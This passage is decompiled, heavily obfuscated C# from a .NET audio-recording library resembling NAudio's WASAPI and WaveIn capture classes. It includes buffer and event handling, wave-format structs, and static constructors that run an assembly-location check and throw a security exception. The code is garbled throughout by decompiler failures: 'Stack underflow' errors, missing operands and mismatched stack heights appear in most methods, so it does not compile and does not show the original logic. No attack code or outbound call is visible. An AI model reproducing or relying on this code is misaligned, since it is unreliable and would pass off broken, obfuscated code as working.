				return (global::_0005._0005)/*Error near IL_000a: Stack underflow*/;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0014)/*Error near IL_0009: Stack underflow*/)._0001 = (global::_0005._0005)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public event EventHandler<global::_0001._0006> DataAvailable
		{
			[CompilerGenerated]
			add
			{
				//IL_002d: Incompatible stack heights: 0 vs 1
				//IL_0033: Incompatible stack heights: 0 vs 1
				EventHandler<global::_0001._0006> eventHandler = ((_0014)/*Error near IL_0007: Stack underflow*/)._0001;
				EventHandler<global::_0001._0006> eventHandler2;
				do
				{
					eventHandler2 = (EventHandler<global::_0001._0006>)/*Error near IL_000c: Stack underflow*/;
					EventHandler<global::_0001._0006> value2 = (EventHandler<global::_0001._0006>)Delegate.Combine(eventHandler2, value);
					eventHandler = Interlocked.CompareExchange(ref this._0001, value2, eventHandler2);
				}
				while ((object)eventHandler != eventHandler2);
			}
			[CompilerGenerated]
			remove
			{
				//IL_002d: Incompatible stack heights: 0 vs 1
				//IL_0033: Incompatible stack heights: 0 vs 1
				EventHandler<global::_0001._0006> eventHandler = ((_0014)/*Error near IL_0007: Stack underflow*/)._0001;
				EventHandler<global::_0001._0006> eventHandler2;
				do
				{
					eventHandler2 = (EventHandler<global::_0001._0006>)/*Error near IL_000c: Stack underflow*/;
					EventHandler<global::_0001._0006> value2 = (EventHandler<global::_0001._0006>)Delegate.Remove(eventHandler2, value);
					eventHandler = Interlocked.CompareExchange(ref this._0001, value2, eventHandler2);
				}
				while ((object)eventHandler != eventHandler2);
			}
		}

		public event EventHandler<global::_0003._0003> RecordingStopped
		{
			[CompilerGenerated]
			add
			{
				//IL_002d: Incompatible stack heights: 0 vs 1
				//IL_0033: Incompatible stack heights: 0 vs 1
				EventHandler<global::_0003._0003> eventHandler = ((_0014)/*Error near IL_0007: Stack underflow*/)._0001;
				EventHandler<global::_0003._0003> eventHandler2;
				do
				{
					eventHandler2 = (EventHandler<global::_0003._0003>)/*Error near IL_000c: Stack underflow*/;
					EventHandler<global::_0003._0003> value2 = (EventHandler<global::_0003._0003>)Delegate.Combine(eventHandler2, value);
					eventHandler = Interlocked.CompareExchange(ref this._0001, value2, eventHandler2);
				}
				while ((object)eventHandler != eventHandler2);
			}
			[CompilerGenerated]
			remove
			{
				//IL_002d: Incompatible stack heights: 0 vs 1
				//IL_0033: Incompatible stack heights: 0 vs 1
				EventHandler<global::_0003._0003> eventHandler = ((_0014)/*Error near IL_0007: Stack underflow*/)._0001;
				EventHandler<global::_0003._0003> eventHandler2;
				do
				{
					eventHandler2 = (EventHandler<global::_0003._0003>)/*Error near IL_000c: Stack underflow*/;
					EventHandler<global::_0003._0003> value2 = (EventHandler<global::_0003._0003>)Delegate.Remove(eventHandler2, value);
					eventHandler = Interlocked.CompareExchange(ref this._0001, value2, eventHandler2);
				}
				while ((object)eventHandler != eventHandler2);
			}
		}

		public _0014()
			: this(global::_0011._0018._0001())
		{
		}

		public _0014(global::_0010._0019 _008A_008F_0006)
			: this(_008A_008F_0006, _009D_008F_0006: false)
		{
		}

		public _0014(global::_0010._0019 _008A_008F_0006, bool _009D_008F_0006)
			: this(_008A_008F_0006, _009D_008F_0006, 100)
		{
		}

		public _0014(global::_0010._0019 _008A_008F_0006, bool _009D_008F_0006, int _009D_0091_0006)
		{
			this._0001 = SynchronizationContext.Current;
			this.m__0001 = _008A_008F_0006.AudioClient;
			ShareMode = global::_0003._000F._0001;
			this._0002 = _009D_008F_0006;
			this.m__0002 = _009D_0091_0006;
			this._0001 = this.m__0001.MixFormat;
		}

		private void _0003()
		{
			//IL_001e: Unknown result type (might be due to invalid IL or missing references)
			//IL_0161: Incompatible stack heights: 0 vs 1
			//IL_0167: Incompatible stack heights: 0 vs 2
			//IL_016d: Expected I8, but got Unknown
			if (((_0014)/*Error near IL_000a: Stack underflow*/).m__0001)
			{
				return;
			}
			_ = 10000;
			int num = ((_0014)/*Error near IL_001d: Stack underflow*/).m__0002;
			long num2 = /*Error near IL_001f: Stack underflow*/* num;
			global::_0007._0014 obj = this.m__0001;
			global::_0003._000F obj2 = ShareMode;
			global::_0005._0005 obj3 = this._0001;
			if (!global::_0011._0018._0001(obj3, obj2, obj))
			{
				throw new ArgumentException(_0080._0014._0001(107406312));
			}
			global::_0005._0012 obj4 = this._0001();
			if (this._0002)
			{
				if (ShareMode == global::_0003._000F._0001)
				{
					global::_0011._0018._0001(this.m__0001, ShareMode, global::_0005._0012._0004 | obj4, num2, 0L, this._0001, Guid.Empty);
				}
				else
				{
					global::_0011._0018._0001(this.m__0001, ShareMode, global::_0005._0012._0004 | obj4, num2, num2, this._0001, Guid.Empty);
				}
				this._0001 = new EventWaitHandle(initialState: false, EventResetMode.AutoReset);
				global::_0007._0014 obj5 = this.m__0001;
				IntPtr intPtr = _0096_0002._007E_0006_0006(_0095_0002._007E_0005_0006(this._0001));
				global::_0011._0018._0001(intPtr, obj5);
			}
			else
			{
				global::_0011._0018._0001(this.m__0001, ShareMode, obj4, num2, 0L, this._0001, Guid.Empty);
			}
			int num3 = this.m__0001.BufferSize;
			this._0001 = this._0001._0001 * this._0001._0003 / 8;
			this._0001 = new byte[num3 * this._0001];
			this.m__0001 = true;
		}

		protected virtual global::_0005._0012 _0001()
		{
			return global::_0005._0012._0001;
		}

		public void _0001()
		{
			//IL_004f: Incompatible stack heights: 0 vs 1
			//IL_0056: Incompatible stack heights: 0 vs 1
			//IL_005d: Incompatible stack heights: 0 vs 1
			if (((_0014)/*Error near IL_0009: Stack underflow*/)._0001 != 0)
			{
				_0080._0014._0001(107406279);
				new InvalidOperationException((string?)/*Error near IL_005d: Stack underflow*/);
				throw /*Error near IL_0015: Stack underflow*/;
			}
			this._0001 = _001F._0014._0002;
			_0003();
			ThreadStart start = delegate
			{
				//IL_000d: Incompatible stack heights: 0 vs 1
				//IL_0010: Incompatible stack heights: 0 vs 1
				global::_0007._0014 obj = ((_0014)/*Error near IL_0009: Stack underflow*/).m__0001;
				global::_0011._0018._0001((_0014)/*Error near IL_0017: Stack underflow*/, obj);
			};
			this._0001 = new Thread(start);
			global::_0008._007E_0002_0002(this._0001);
		}

		public void _0002()
		{
			//IL_0017: Incompatible stack heights: 0 vs 1
			//IL_001a: Incompatible stack heights: 0 vs 1
			if (((_0014)/*Error near IL_0009: Stack underflow*/)._0001 != 0)
			{
				((_0014)/*Error near IL_0015: Stack underflow*/)._0001 = _001F._0014._0004;
			}
		}

		public void _0004()
		{
			//IL_0040: Incompatible stack heights: 0 vs 1
			//IL_004a: Incompatible stack heights: 0 vs 1
			((_0014)/*Error near IL_0047: Stack underflow*/)._0002();
			if (((_0014)/*Error near IL_000b: Stack underflow*/)._0001 != null)
			{
				global::_0008._007E_0005_0002(this._0001);
				this._0001 = null;
			}
			if (this.m__0001 != null)
			{
				this.m__0001._0001();
				this.m__0001 = null;
			}
		}

		void IDisposable.Dispose()
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			this._0004();
		}

		[CompilerGenerated]
		private void _0005()
		{
			//IL_000d: Incompatible stack heights: 0 vs 1
			//IL_0010: Incompatible stack heights: 0 vs 1
			global::_0007._0014 obj = ((_0014)/*Error near IL_0009: Stack underflow*/).m__0001;
			global::_0011._0018._0001((_0014)/*Error near IL_0017: Stack underflow*/, obj);
		}
	}
}
namespace _000E
{
	internal sealed class _0005 : IDisposable, global::_0013._0008
	{
		[CompilerGenerated]
		internal sealed class _0001
		{
			public EventHandler<global::_0003._0003> _0001;

			public Exception _0001;

			public _0005 _0001;

			internal void _0001(object _0002)
			{
				//IL_0021: Incompatible stack heights: 0 vs 1
				//IL_0024: Incompatible stack heights: 0 vs 2
				//IL_0027: Incompatible stack heights: 0 vs 2
				_ = ((_0001)/*Error near IL_0007: Stack underflow*/)._0001;
				_ = ((_0001)/*Error near IL_000e: Stack underflow*/)._0001;
				global::_0003._0003 e = new global::_0003._0003(((_0001)/*Error near IL_0015: Stack underflow*/)._0001);
				/*Error near IL_001f: Stack underflow*/((object?)/*Error near IL_001f: Stack underflow*/, e);
			}
		}

		internal IntPtr _0001;

		private volatile bool m__0001;

		internal global::_0011._0005[] _0001;

		private readonly global::_0017._0008._0003 m__0001;

		private _000E m__0001;

		internal readonly SynchronizationContext _0001;

		private int m__0001;

		[CompilerGenerated]
		internal EventHandler<global::_0001._0006> _0001;

		[CompilerGenerated]
		internal EventHandler<global::_0003._0003> _0001;

		[CompilerGenerated]
		private int m__0002;

		[CompilerGenerated]
		private int m__0003;

		[CompilerGenerated]
		private int m__0004;

		[CompilerGenerated]
		private global::_0005._0005 m__0001;

		public static int DeviceCount
		{
			get
			{
				//IL_0008: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001();
				return (int)/*Error near IL_0003: Stack underflow*/;
			}
		}

		public int BufferMilliseconds
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0005)/*Error near IL_0007: Stack underflow*/).m__0002;
			}
			[CompilerGenerated]
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0005)/*Error near IL_0009: Stack underflow*/).m__0002 = (int)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public int NumberOfBuffers
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0005)/*Error near IL_0007: Stack underflow*/).m__0003;
			}
			[CompilerGenerated]
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0005)/*Error near IL_0009: Stack underflow*/).m__0003 = (int)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public int DeviceNumber
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0005)/*Error near IL_0007: Stack underflow*/).m__0004;
			}
			[CompilerGenerated]
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0005)/*Error near IL_0009: Stack underflow*/).m__0004 = (int)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public global::_0005._0005 WaveFormat
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0005)/*Error near IL_0007: Stack underflow*/).m__0001;
			}
			[CompilerGenerated]
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0005)/*Error near IL_0009: Stack underflow*/).m__0001 = (global::_0005._0005)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public event EventHandler<global::_0001._0006> DataAvailable
		{
			[CompilerGenerated]
			add
			{
				//IL_002d: Incompatible stack heights: 0 vs 1
				//IL_0033: Incompatible stack heights: 0 vs 1
				EventHandler<global::_0001._0006> eventHandler = ((_0005)/*Error near IL_0007: Stack underflow*/)._0001;
				EventHandler<global::_0001._0006> eventHandler2;
				do
				{
					eventHandler2 = (EventHandler<global::_0001._0006>)/*Error near IL_000c: Stack underflow*/;
					EventHandler<global::_0001._0006> value2 = (EventHandler<global::_0001._0006>)Delegate.Combine(eventHandler2, value);
					eventHandler = Interlocked.CompareExchange(ref this._0001, value2, eventHandler2);
				}
				while ((object)eventHandler != eventHandler2);
			}
			[CompilerGenerated]
			remove
			{
				//IL_002d: Incompatible stack heights: 0 vs 1
				//IL_0033: Incompatible stack heights: 0 vs 1
				EventHandler<global::_0001._0006> eventHandler = ((_0005)/*Error near IL_0007: Stack underflow*/)._0001;
				EventHandler<global::_0001._0006> eventHandler2;
				do
				{
					eventHandler2 = (EventHandler<global::_0001._0006>)/*Error near IL_000c: Stack underflow*/;
					EventHandler<global::_0001._0006> value2 = (EventHandler<global::_0001._0006>)Delegate.Remove(eventHandler2, value);
					eventHandler = Interlocked.CompareExchange(ref this._0001, value2, eventHandler2);
				}
				while ((object)eventHandler != eventHandler2);
			}
		}

		public event EventHandler<global::_0003._0003> RecordingStopped
		{
			[CompilerGenerated]
			add
			{
				//IL_002d: Incompatible stack heights: 0 vs 1
				//IL_0033: Incompatible stack heights: 0 vs 1
				EventHandler<global::_0003._0003> eventHandler = ((_0005)/*Error near IL_0007: Stack underflow*/)._0001;
				EventHandler<global::_0003._0003> eventHandler2;
				do
				{
					eventHandler2 = (EventHandler<global::_0003._0003>)/*Error near IL_000c: Stack underflow*/;
					EventHandler<global::_0003._0003> value2 = (EventHandler<global::_0003._0003>)Delegate.Combine(eventHandler2, value);
					eventHandler = Interlocked.CompareExchange(ref this._0001, value2, eventHandler2);
				}
				while ((object)eventHandler != eventHandler2);
			}
			[CompilerGenerated]
			remove
			{
				//IL_002d: Incompatible stack heights: 0 vs 1
				//IL_0033: Incompatible stack heights: 0 vs 1
				EventHandler<global::_0003._0003> eventHandler = ((_0005)/*Error near IL_0007: Stack underflow*/)._0001;
				EventHandler<global::_0003._0003> eventHandler2;
				do
				{
					eventHandler2 = (EventHandler<global::_0003._0003>)/*Error near IL_000c: Stack underflow*/;
					EventHandler<global::_0003._0003> value2 = (EventHandler<global::_0003._0003>)Delegate.Remove(eventHandler2, value);
					eventHandler = Interlocked.CompareExchange(ref this._0001, value2, eventHandler2);
				}
				while ((object)eventHandler != eventHandler2);
			}
		}

		public _0005()
			: this(new _000E(global::_001B._0007._0002, IntPtr.Zero))
		{
		}

		public _0005(IntPtr _008B_008F_0006)
			: this(global::_0011._0018._0001(_008B_008F_0006))
		{
		}

		public _0005(_000E _008C_008F_0006)
		{
			this._0001 = SynchronizationContext.Current;
			if ((_008C_008F_0006.Strategy == global::_001B._0007._0002 || _008C_008F_0006.Strategy == global::_001B._0007._0003) && this._0001 == null)
			{
				throw new InvalidOperationException(_0080._0014._0001(107389694));
			}
			DeviceNumber = 0;
			WaveFormat = new global::_0005._0005(8000, 16, 1);
			BufferMilliseconds = 100;
			NumberOfBuffers = 3;
			this.m__0001 = _0001;
			this.m__0001 = _008C_008F_0006;
			global::_0011._0018._0001(this.m__0001, _008C_008F_0006);
		}

		private void _0003()
		{
			//IL_0013: Unknown result type (might be due to invalid IL or missing references)
			//IL_0019: Unknown result type (might be due to invalid IL or missing references)
			//IL_001b: Expected I4, but got Unknown
			//IL_0074: Incompatible stack heights: 0 vs 1
			//IL_007e: Incompatible stack heights: 0 vs 1
			//IL_0084: Incompatible stack heights: 0 vs 1
			_ = ((_0005)/*Error near IL_007e: Stack underflow*/).BufferMilliseconds;
			int num = ((_0005)/*Error near IL_000e: Stack underflow*/).WaveFormat._0002;
			int num2 = /*Error near IL_0014: Stack underflow*/* num / 1000;
			if (num2 % WaveFormat.BlockAlign != 0)
			{
				num2 -= num2 % WaveFormat.BlockAlign;
			}
			this._0001 = new global::_0011._0005[NumberOfBuffers];
			for (int i = 0; i < this._0001.Length; i++)
			{
				this._0001[i] = new global::_0011._0005(this._0001, num2);
			}
		}

		private void _0001(IntPtr _0002, global::_0017._0008._0002 _0003, IntPtr _0004, global::_007F._0006 _0005, IntPtr _0006)
		{
			//IL_0007: Invalid comparison between Unknown and I4
			//IL_006d: Incompatible stack heights: 0 vs 1
			//IL_0073: Incompatible stack heights: 0 vs 1
			//IL_0077: Incompatible stack heights: 0 vs 2
			if ((int)/*Error near IL_0009: Stack underflow*/ != 960 || !((_0005)/*Error near IL_0012: Stack underflow*/).m__0001)
			{
				return;
			}
			_ = _009A_0002._0012_0006;
			IntPtr intPtr = ((global::_007F._0006)/*Error near IL_0020: Stack underflow*/)._0002;
			global::_0011._0005 obj = (global::_0011._0005)/*Error near IL_0025: Stack underflow*/(intPtr).Target;
			if (obj != null)
			{
				this.m__0001 = Array.IndexOf(this._0001, obj);
				global::_0011._0018._0001(this, obj);
				try
				{
					global::_0011._0018._0001(obj);
				}
				catch (Exception ex)
				{
					this.m__0001 = false;
					global::_0011._0018._0001(this, ex);
				}
			}
		}

		private void _0004()
		{
			//IL_004b: Incompatible stack heights: 0 vs 1
			//IL_0055: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_0005)/*Error near IL_0052: Stack underflow*/);
			_000E obj = ((_0005)/*Error near IL_000b: Stack underflow*/).m__0001;
			ref IntPtr reference = ref this._0001;
			int num = DeviceNumber;
			global::_0005._0005 obj2 = WaveFormat;
			global::_0017._0008._0003 obj3 = this.m__0001;
			global::_0011._0018._0001(global::_0011._0018._0001(obj3, obj2, ref reference, obj, num), _0080._0014._0001(107390053));
			_0003();
		}

		public void _0001()
		{
			//IL_0046: Incompatible stack heights: 0 vs 1
			//IL_004d: Incompatible stack heights: 0 vs 1
			//IL_0054: Incompatible stack heights: 0 vs 1
			if (((_0005)/*Error near IL_0009: Stack underflow*/).m__0001)
			{
				_0080._0014._0001(107390068);
				new InvalidOperationException((string?)/*Error near IL_0054: Stack underflow*/);
				throw /*Error near IL_0015: Stack underflow*/;
			}
			_0004();
			global::_0011._0018._0001(this);
			global::_0011._0018._0001(global::_0011._0018._0001(this._0001), _0080._0014._0001(107390043));
			this.m__0001 = true;
		}

		public void _0002()
		{
			//IL_0082: Incompatible stack heights: 0 vs 1
			//IL_0088: Incompatible stack heights: 0 vs 1
			//IL_008e: Incompatible stack heights: 0 vs 1
			if (!((_0005)/*Error near IL_0009: Stack underflow*/).m__0001)
			{
				return;
			}
			((_0005)/*Error near IL_0015: Stack underflow*/).m__0001 = false;
			global::_0011._0018._0001(global::_0011._0018._0001(((_0005)/*Error near IL_001c: Stack underflow*/)._0001), _0080._0014._0001(107389994));
			for (int i = 0; i < this._0001.Length; i++)
			{
				int num = (i + this.m__0001 + 1) % this._0001.Length;
				global::_0011._0005 obj = this._0001[num];
				if ((obj._0001._0001 & global::_000E._0004._0002) == global::_000E._0004._0002)
				{
					global::_0011._0018._0001(this, obj);
				}
			}
			global::_0011._0018._0001(this, (Exception)null);
		}

		protected virtual void _0001(bool _0002)
		{
			//IL_0038: Incompatible stack heights: 0 vs 1
			//IL_003b: Incompatible stack heights: 0 vs 1
			//IL_003e: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ != 0)
			{
				if (((_0005)/*Error near IL_000d: Stack underflow*/).m__0001)
				{
					((_0005)/*Error near IL_0016: Stack underflow*/)._0002();
				}
				global::_0011._0018._0001(this);
				if (this.m__0001 != null)
				{
					global::_0011._0018._0001(this.m__0001);
					this.m__0001 = null;
				}
			}
		}

		public void _0005()
		{
			//IL_0013: Incompatible stack heights: 0 vs 1
			//IL_001d: Incompatible stack heights: 0 vs 2
			((_0005)/*Error near IL_001a: Stack underflow*/)._0001(_0002: true);
			_ = _0091_0002._009B_0005;
			/*Error near IL_0011: Stack underflow*/((object)/*Error near IL_0011: Stack underflow*/);
		}

		void IDisposable.Dispose()
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			this._0005();
		}
	}
}
namespace _0019
{
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
	internal struct _0004
	{
		private short m__0001;

		private short _0002;

		private int m__0001;

		[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)]
		private string m__0001;

		private global::_001A._0002 m__0001;

		private short _0003;

		private short _0004;

		private Guid m__0001;

		private Guid _0002;

		private Guid _0003;

		private const int _0002 = 32;

		public int Channels => ((_0004)/*Error near IL_0007: Stack underflow*/)._0003;

		public string ProductName => ((_0004)/*Error near IL_0007: Stack underflow*/).m__0001;

		public Guid NameGuid => ((_0004)/*Error near IL_0007: Stack underflow*/)._0003;

		public Guid ProductGuid => ((_0004)/*Error near IL_0007: Stack underflow*/)._0002;

		public Guid ManufacturerGuid => ((_0004)/*Error near IL_0007: Stack underflow*/).m__0001;

		public bool _0001(global::_001A._0002 _0002)
		{
			//IL_0009: Unknown result type (might be due to invalid IL or missing references)
			//IL_0010: Incompatible stack heights: 0 vs 1
			//IL_0013: Incompatible stack heights: 0 vs 2
			//IL_0016: Incompatible stack heights: 0 vs 2
			_ = ((_0004)/*Error near IL_0007: Stack underflow*/).m__0001;
			_ = /*Error near IL_000a: Stack underflow*/& /*Error near IL_000a: Stack underflow*/;
			return /*Error near IL_000e: Stack underflow*/== /*Error near IL_000e: Stack underflow*/;
		}
	}
}
namespace _000E
{
	internal static class _0006
	{
		public static readonly Guid _0001;

		public static readonly Guid _0002;

		public static readonly Guid _0003;

		static _0006()
		{
			//IL_00f5: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly = (Assembly)/*Error near IL_00fb: Stack underflow*/;
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (!global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) || !flag || !global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				throw new SecurityException(_0080._0014._0001(107396706));
			}
			_0001 = new Guid(_0080._0014._0001(107389629));
			_0002 = new Guid(_0080._0014._0001(107389548));
			_0003 = new Guid(_0080._0014._0001(107389531));
		}
	}
}
namespace _0001
{
	internal sealed class _0006 : EventArgs
	{
		internal byte[] _0001;

		internal int _0001;

		public byte[] Buffer => ((_0006)/*Error near IL_0007: Stack underflow*/)._0001;

		public int BytesRecorded => ((_0006)/*Error near IL_0007: Stack underflow*/)._0001;

		public _0006(byte[] _001E_0010, int _0082_0010)
		{
			this._0001 = _001E_0010;
			_0001 = _0082_0010;
		}
	}
}
namespace _0017
{
	internal sealed class _0008
	{
		[Flags]
		public enum _0001
		{
			_0001 = 0,
			_0002 = 0x30000,
			_0003 = 0x50000,
			_0004 = 0x10000,
			_0005 = 0x20000
		}

		public enum _0002
		{
			_0001 = 958,
			_0002 = 959,
			_0003 = 960,
			_0004 = 956,
			_0005 = 957,
			_0006 = 955
		}

		public delegate void _0003(IntPtr hWaveOut, _0002 message, IntPtr dwInstance, global::_007F._0006 wavhdr, IntPtr dwReserved);

		static _0008()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), global::_0080._0014._0001(107396751), global::_0080._0014._0001(107396746)), global::_0080._0014._0001(107396741), global::_0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), global::_0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(global::_0080._0014._0001(107396706));
		}
	}
}
namespace _001F
{
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
	internal struct _0005
	{
		private short m__0001;

		private short _0002;

		private int m__0001;

		[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)]
		private string m__0001;

		private global::_001A._0002 m__0001;

		private short _0003;

		private short _0004;

		private _001B._0005 m__0001;

		private Guid m__0001;

		private Guid _0002;

		private Guid _0003;

		private const int _0002 = 32;

		public int Channels => ((_0005)/*Error near IL_0007: Stack underflow*/)._0003;

		public bool SupportsPlaybackRateControl => (((_0005)/*Error near IL_0007: Stack underflow*/).m__0001 & _001B._0005._0002) == _001B._0005._0002;

		public string ProductName => ((_0005)/*Error near IL_0007: Stack underflow*/).m__0001;

		public Guid NameGuid => ((_0005)/*Error near IL_0007: Stack underflow*/)._0003;

		public Guid ProductGuid => ((_0005)/*Error near IL_0007: Stack underflow*/)._0002;

		public Guid ManufacturerGuid => ((_0005)/*Error near IL_0007: Stack underflow*/).m__0001;

		public bool _0001(global::_001A._0002 _0002)
		{
			//IL_0009: Unknown result type (might be due to invalid IL or missing references)
			//IL_0010: Incompatible stack heights: 0 vs 1
			//IL_0013: Incompatible stack heights: 0 vs 2
			//IL_0016: Incompatible stack heights: 0 vs 2
			_ = ((_0005)/*Error near IL_0007: Stack underflow*/).m__0001;
			_ = /*Error near IL_000a: Stack underflow*/& /*Error near IL_000a: Stack underflow*/;
			return /*Error near IL_000e: Stack underflow*/== /*Error near IL_000e: Stack underflow*/;
		}
	}
}
namespace _001A
{
	[Flags]
	internal enum _0002
	{
		_0001 = 1,
		_0002 = 2,
		_0003 = 4,
		_0004 = 8,
		_0005 = 0x10,
		_0006 = 0x20,
		_0007 = 0x40,
		_0008 = 0x80,
		_000E = 0x100,
		_000F = 0x200,
		_0010 = 0x400,
		_0011 = 0x800,
		_0012 = 0x100,
		_0013 = 0x200,
		_0014 = 0x400,
		_0015 = 0x800,
		_0016 = 0x1000,
		_0017 = 0x2000,
		_0018 = 0x4000,
		_0019 = 0x8000,
		_001A = 0x10000,
		_001B = 0x20000,
		_001C = 0x40000,
		_001D = 0x80000
	}
}
namespace _001B
{
	[Flags]
	internal enum _0005
	{
		_0001 = 1,
		_0002 = 2,
		_0003 = 4,
		_0004 = 8,
		_0005 = 0x10,
		_0006 = 0x20
	}
}
namespace _001D
{
	internal sealed class _0003 : NativeWindow
	{
		private global::_0017._0008._0003 m__0001;

		public _0003(global::_0017._0008._0003 _008D_008F_0006)
		{
			this.m__0001 = _008D_008F_0006;
		}

		protected override void _0001(ref Message _0002)
		{
			//IL_0098: Incompatible stack heights: 0 vs 1
			//IL_00a2: Incompatible stack heights: 0 vs 1
			((Message)/*Error near IL_00a2: Stack underflow*/).get_Msg();
			global::_0017._0008._0002 obj = (global::_0017._0008._0002)/*Error near IL_00a8: Stack underflow*/;
			switch (obj)
			{
			case global::_0017._0008._0002._0005:
			case global::_0017._0008._0002._0003:
			{
				IntPtr wParam = ((Message)(ref _0002)).get_WParam();
				_007F._0006 obj2 = new _007F._0006();
				_009B_0002._0013_0006(((Message)(ref _0002)).get_LParam(), obj2);
				this.m__0001(wParam, obj, IntPtr.Zero, obj2, IntPtr.Zero);
				break;
			}
			case global::_0017._0008._0002._0006:
			case global::_0017._0008._0002._0004:
			case global::_0017._0008._0002._0001:
			case global::_0017._0008._0002._0002:
				this.m__0001(((Message)(ref _0002)).get_WParam(), obj, IntPtr.Zero, null, IntPtr.Zero);
				break;
			default:
				_009C_0002._0014_0006(this, ref _0002);
				break;
			}
		}
	}
}
namespace _007F
{
	internal sealed class _0007 : Form
	{
		private global::_0017._0008._0003 m__0001;

		public _0007(global::_0017._0008._0003 _008D_008F_0006)
		{
			this.m__0001 = _008D_008F_0006;
		}

		protected override void _0001(ref Message _0002)
		{
			//IL_0098: Incompatible stack heights: 0 vs 1
			//IL_00a2: Incompatible stack heights: 0 vs 1
			((Message)/*Error near IL_00a2: Stack underflow*/).get_Msg();
			global::_0017._0008._0002 obj = (global::_0017._0008._0002)/*Error near IL_00a8: Stack underflow*/;
			switch (obj)
			{
			case global::_0017._0008._0002._0005:
			case global::_0017._0008._0002._0003:
			{
				IntPtr wParam = ((Message)(ref _0002)).get_WParam();
				_0006 obj2 = new _0006();
				_009B_0002._0013_0006(((Message)(ref _0002)).get_LParam(), obj2);
				this.m__0001(wParam, obj, IntPtr.Zero, obj2, IntPtr.Zero);
				break;
			}
			case global::_0017._0008._0002._0006:
			case global::_0017._0008._0002._0004:
			case global::_0017._0008._0002._0001:
			case global::_0017._0008._0002._0002:
				this.m__0001(((Message)(ref _0002)).get_WParam(), obj, IntPtr.Zero, null, IntPtr.Zero);
				break;
			default:
				_009C_0002._0015_0006(this, ref _0002);
				break;
			}
		}

		static _0007()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0010
{
	[StructLayout(LayoutKind.Sequential, Pack = 2)]
	internal sealed class _0005 : global::_0005._0005
	{
		private new readonly short m__0001;

		public short SamplesPerBlock => ((_0005)/*Error near IL_0007: Stack underflow*/).m__0001;

		public _0005()
		{
			base._0001 = WaveFormatEncoding.Gsm610;
			base._0001 = 1;
			base._0002 = 1625;
			_0003 = 0;
			_0002 = 65;
			base._0001 = 8000;
			_0004 = 2;
			this.m__0001 = 320;
		}

		public override void _0001(BinaryWriter _0002)
		{
			//IL_0019: Incompatible stack heights: 0 vs 1
			//IL_001c: Incompatible stack heights: 0 vs 1
			((global::_0005._0005)/*Error near IL_0023: Stack underflow*/)._0001((BinaryWriter)/*Error near IL_0023: Stack underflow*/);
			_008F_0002._007E_0098_0005(_0002, this.m__0001);
		}
	}
}
namespace _0005
{
	[StructLayout(LayoutKind.Sequential, Pack = 2)]
	internal class _0005
	{
		protected internal WaveFormatEncoding _0001;

		protected internal short _0001;

		protected internal int _0001;

		protected internal int _0002;

		protected internal short _0002;

		protected internal short _0003;

		protected internal short _0004;

		public WaveFormatEncoding Encoding => ((_0005)/*Error near IL_0007: Stack underflow*/)._0001;

		public int Channels => ((_0005)/*Error near IL_0007: Stack underflow*/)._0001;

		public int SampleRate => ((_0005)/*Error near IL_0007: Stack underflow*/)._0001;

		public int AverageBytesPerSecond => ((_0005)/*Error near IL_0007: Stack underflow*/)._0002;

